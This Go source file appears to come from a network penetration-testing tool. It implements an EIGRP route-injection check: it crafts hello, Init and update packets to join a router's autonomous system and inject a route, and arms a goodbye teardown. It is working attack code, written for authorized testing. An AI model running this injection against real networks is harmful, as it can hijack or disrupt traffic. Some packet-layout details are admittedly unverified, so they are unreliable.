// eigrp.go implements the EIGRP route injection check. Impact temporary,
// restore active, affects fabric: the hello, the null update, and the
// route update offer the autonomous system a neighbor and a route, and
// the armed goodbye, a hello carrying the Peer Termination TLV, withdraws
// the adjacency when the run ends. Successful transmission does not
// establish that a router accepted or removed the route.

package routing

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

// EIGRP TLV types (RFC 7868 section 6.7).
const (
	eigrpTLVParameters      uint16 = 0x0001 // Parameters, section 6.7.1
	eigrpTLVSequence        uint16 = 0x0002 // Sequence
	eigrpTLVSWVersion       uint16 = 0x0003 // Software Version
	eigrpTLVNextMult        uint16 = 0x0004 // Next Multicast Sequence
	eigrpTLVPeerTermination uint16 = 0x0007 // Peer Termination, section 6.7.7
	eigrpTLVIPv4Internal    uint16 = 0x0102 // IPv4 Internal route
)

// EIGRP header flags (RFC 7868 section 6.5).
const (
	eigrpFlagInit uint32 = 0x01 // Init flag: the null update that opens an adjacency, section 5.3.3
)

// eigrpAS is the autonomous system the check joins, probe content.
const eigrpAS uint16 = 100

// eigrpParameters is the Parameters TLV value: K1 to K6 at the RFC 7868
// section 6.7.1 defaults (K1 1, K2 0, K3 1, K4 0, K5 0, K6 0) and a hold
// time of 15 s. Two routers become neighbors only if the K-values are the
// same (section 5.3.2), so a hello without the TLV forms nothing.
var eigrpParameters = []byte{1, 0, 1, 0, 0, 0, 0x00, 0x0f}

// eigrpFinding is the finding detail for the EIGRP behavior.
type eigrpFinding struct {
	Action  string `json:"action"`
	AS      uint16 `json:"as"`
	Route   string `json:"route"`
	Opcode  string `json:"opcode"`
	Restore string `json:"restore"`
	// Refused is true when the target rejected adjacency.
	Refused bool `json:"refused,omitempty"`
}

// RunEIGRP sends a hello carrying the Parameters TLV from the attack leg's
// own addresses, reads a hello from another sender in its autonomous
// system, sends the null update with the Init flag (RFC 7868 section
// 5.3.3), and reads for the target's acknowledgment, a unicast hello to
// the attack leg's IPv4 with a non-zero Ack number (section 5.2), after
// which it sends the update injecting the target's IPv4 route, with the
// goodbye teardown armed before the first frame. The autonomous system
// number and the metric are probe content. The predicate is the
// acknowledgment, which confirms; a hello carrying the Peer Termination
// TLV, or the older K-values-of-255 form, from a sender in the system
// resists as a refused adjacency; no hello in the system within the window
// resists; and an unanswered null update resists. A receive failure stops
// the sequence. Cancellation returns ctx.Err(). Concurrent calls require
// separate dependencies.
func RunEIGRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := ctx.Err(); err != nil {
		return check.Verdict{}, err
	}
	if err := deps.Target.Need(check.FieldRoute4); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()

	// Arm the teardown before the first frame: the goodbye hello
	// carrying the Peer Termination TLV, which resets the adjacency.
	goodbyePkt, err := craftEIGRPGoodbye(addr, eigrpAS)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "eigrp: craft goodbye")
	}
	deps.Teardown.Arm("eigrp-goodbye", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, goodbyePkt)
	})

	// Phase 1: the hello with the Parameters TLV.
	helloPkt, err := craftEIGRPHello(addr, eigrpAS)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "eigrp: craft hello")
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "eigrp: send hello")
	}

	// Phase 2: a hello from another sender in the system, or its goodbye.
	refused := false
	hello, pre, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		if isEIGRPGoodbyeInAS(data, addr.MAC, eigrpAS) {
			refused = true
			return true
		}
		return isEIGRPHelloInAS(data, addr.MAC, eigrpAS)
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "eigrp: receive")
	}
	if refused {
		return eigrpRefused(deps, pre.Elapsed)
	}
	if hello == nil {
		return check.Resisted(fmt.Sprintf("no EIGRP hello for AS %d in %s", eigrpAS, pre.Elapsed.Round(time.Millisecond)), pre.Elapsed), nil
	}

	// Phase 3: the null update with the Init flag.
	initPkt, err := craftEIGRPNullUpdate(addr, eigrpAS)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "eigrp: craft null update")
	}
	if err := deps.AttackLeg.Send(ctx, initPkt); err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "eigrp: send null update")
	}

	// Phase 4: the target's acknowledgment, or its goodbye.
	ack, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, func(data []byte) bool {
		if isEIGRPGoodbyeInAS(data, addr.MAC, eigrpAS) {
			refused = true
			return true
		}
		return isEIGRPAckTo(data, addr.MAC, addr.IPv4, eigrpAS)
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "eigrp: receive acknowledgment")
	}
	observed := pre.Elapsed + obs.Elapsed
	if refused {
		return eigrpRefused(deps, observed)
	}
	if ack == nil {
		return check.Resisted(fmt.Sprintf("the null update drew no acknowledgment in %s", obs.Elapsed.Round(time.Millisecond)), observed), nil
	}

	// Phase 5: route inject (Update with IPv4 Internal TLV).
	injectPkt, err := craftEIGRPRouteInject(addr, eigrpAS, deps.Target.Route4)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "eigrp: craft inject")
	}
	if err := deps.AttackLeg.Send(ctx, injectPkt); err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "eigrp: send inject")
	}

	detail := eigrpFinding{
		Action:  "eigrp-route-inject",
		AS:      eigrpAS,
		Route:   deps.Target.Route4.String(),
		Opcode:  "update",
		Restore: "goodbye/flush teardown",
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("eigrp", detailBytes)

	return check.Confirmed(fmt.Sprintf("the target acknowledged the adjacency in AS %d", eigrpAS), observed), nil
}

// eigrpRefused records the refused adjacency and returns its verdict.
func eigrpRefused(deps check.Deps, observed time.Duration) (check.Verdict, error) {
	detail := eigrpFinding{
		Action:  "eigrp-adjacency-refused",
		AS:      eigrpAS,
		Opcode:  "hello",
		Restore: "goodbye/flush teardown",
		Refused: true,
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("eigrp", detailBytes)
	return check.Resisted("adjacency refused", observed), nil
}

// extractIPPayload extracts the IP payload from an Ethernet-encapsulated
// IPv4 frame with the expected protocol. Fragmented or truncated packets
// are rejected because this path does not reassemble them. Ethernet padding
// is excluded from the returned payload.
func extractIPPayload(frame []byte, proto int) ([]byte, error) {
	if len(frame) < 14 {
		return nil, errs.Msg("frame too short for Ethernet")
	}
	// Check EtherType is IPv4.
	etherType := binary.BigEndian.Uint16(frame[12:14])
	if etherType != 0x0800 {
		return nil, errs.Msgf("not IPv4 (EtherType 0x%04x)", etherType)
	}
	// IPv4 header: 14-byte Ethernet + 20-byte minimum IPv4.
	if len(frame) < 14+20 {
		return nil, errs.Msg("frame too short for IPv4")
	}
	if frame[14]>>4 != 4 {
		return nil, errs.Msg("invalid ipv4 version")
	}
	if int(frame[23]) != proto {
		return nil, errs.Msgf("unexpected ip protocol %d", frame[23])
	}
	ihl := int(frame[14]&0x0f) * 4
	if ihl < 20 {
		return nil, errs.Msgf("invalid ipv4 header length %d", ihl)
	}
	if len(frame) < 14+ihl {
		return nil, errs.Msg("frame too short for IHL")
	}
	if binary.BigEndian.Uint16(frame[20:22])&0x3fff != 0 {
		return nil, errs.Msg("fragmented ipv4 packet")
	}
	// Trim to IP total length to exclude Ethernet padding.
	ipTotalLen := int(binary.BigEndian.Uint16(frame[16:18]))
	if ipTotalLen < ihl {
		return nil, errs.Msgf("IP total length %d < IHL %d", ipTotalLen, ihl)
	}
	payloadEnd := 14 + ipTotalLen
	if payloadEnd > len(frame) {
		return nil, errs.Msg("truncated ipv4 packet")
	}
	return frame[14+ihl : payloadEnd], nil
}

// eigrpFrame builds Ethernet → IPv4 (proto 88) → EIGRP from the attack
// leg's addresses to the EIGRP group, through the owned [nl.EIGRP] layer.
func eigrpFrame(addr link.Addr, eigrp *nl.EIGRP) ([]byte, error) {
	eth := &layers.Ethernet{
		SrcMAC:       addr.MAC,
		DstMAC:       eigrpMulticastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocol(88),
		SrcIP:    addr.IPv4,
		DstIP:    eigrpMulticast,
	}
	return craft.Default(eth, ip, eigrp)
}

// craftEIGRPHello builds the hello that opens the neighbor relationship:
// no flags, the Parameters TLV.
func craftEIGRPHello(addr link.Addr, asNum uint16) ([]byte, error) {
	return eigrpFrame(addr, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: asNum,
		TLVs:             []nl.EIGRPTLV{{Type: eigrpTLVParameters, Value: eigrpParameters}},
	})
}

// craftEIGRPGoodbye builds the goodbye: a hello carrying the Parameters
// TLV and the Peer Termination TLV, whose value names the attack leg's
// own IPv4 as the peer going down. The value's layout is unverified
// against RFC 7868 section 6.7.7, which is not vendored; the predicate
// reads the TLV's presence.
func craftEIGRPGoodbye(addr link.Addr, asNum uint16) ([]byte, error) {
	return eigrpFrame(addr, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: asNum,
		TLVs: []nl.EIGRPTLV{
			{Type: eigrpTLVParameters, Value: eigrpParameters},
			{Type: eigrpTLVPeerTermination, Value: addr.IPv4.To4()},
		},
	})
}

// craftEIGRPNullUpdate builds the update with the Init flag and no TLV,
// the first message of an adjacency (RFC 7868 section 5.3.3).
func craftEIGRPNullUpdate(addr link.Addr, asNum uint16) ([]byte, error) {
	return eigrpFrame(addr, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeUpdate,
		Flags:            eigrpFlagInit,
		SequenceNumber:   1,
		AutonomousSystem: asNum,
	})
}

// craftEIGRPRouteInject builds an EIGRP Update carrying an IPv4 Internal
// route TLV that injects route with metric 1.
func craftEIGRPRouteInject(addr link.Addr, asNum uint16, route *net.IPNet) ([]byte, error) {
	// IPv4 Internal route TLV: type(2) + length(2) + metric data.
	// The TLV value encodes: prefix length + destination + metric fields.
	prefixLen, _ := route.Mask.Size()
	routeValue := buildIPv4InternalRouteTLV(prefixLen, route.IP, 1)

	return eigrpFrame(addr, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeUpdate,
		Flags:            0,
		SequenceNumber:   2,
		AckNumber:        0,
		VirtualRouterID:  0,
		AutonomousSystem: asNum,
		TLVs: []nl.EIGRPTLV{
			{Type: eigrpTLVIPv4Internal, Value: routeValue},
		},
	})
}

// buildIPv4InternalRouteTLV builds the value for an EIGRP IPv4 Internal
// route TLV. The format (RFC 7868 section 3.3): prefix length (1) +
// destination (variable, rounded up) + metric (variable).
func buildIPv4InternalRouteTLV(prefixLen int, dest net.IP, metric uint32) []byte {
	var v []byte
	v = append(v, byte(prefixLen))
	// Destination: only the network portion, rounded up to whole bytes.
	networkBytes := (prefixLen + 7) / 8
	v = append(v, dest.To4()[:networkBytes]...)
	// Metric fields (RFC 7868): delay(4) + bandwidth(4) + mtu(3) + hop(1)
	// + reliability(1) + load(1) + reserved(2). Minimal: 16 bytes.
	// The metric parameter scales the delay so a lower metric = better route.
	metricBytes := make([]byte, 16)
	binary.BigEndian.PutUint32(metricBytes[0:4], metric) // delay
	binary.BigEndian.PutUint32(metricBytes[4:8], 1000)   // bandwidth
	metricBytes[9] = 1                                   // hop count
	metricBytes[10] = 255                                // reliability
	metricBytes[11] = 1                                  // load
	v = append(v, metricBytes...)
	return v
}

// Compile-time assertion: the owned EIGRP layer implements SerializableLayer.
var _ gopacket.SerializableLayer = (*nl.EIGRP)(nil)
